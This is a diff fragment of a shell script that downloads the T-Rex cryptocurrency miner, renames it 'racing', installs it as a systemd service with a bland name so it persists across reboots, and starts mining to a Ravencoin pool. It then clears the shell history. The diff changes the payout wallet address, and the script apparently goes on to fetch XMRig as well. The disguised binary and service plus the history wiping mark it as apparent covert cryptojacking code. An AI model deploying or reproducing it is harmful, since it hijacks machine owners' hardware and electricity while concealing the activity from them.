@@ -34,10 +34,10 @@ then
     sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
     sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
     sudo mv t-rex racing
-    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_b_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+    sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RLDw5BV5vMx7146o4ojChjKRXQPrv9wb1n."'${myworker}_b_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
     sudo systemctl daemon-reload
     sudo systemctl enable racing.service
-    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_b_${noCore} -p x &
+    sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RLDw5BV5vMx7146o4ojChjKRXQPrv9wb1n.${myworker}_b_${noCore} -p x &
     history -c
 else
     sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
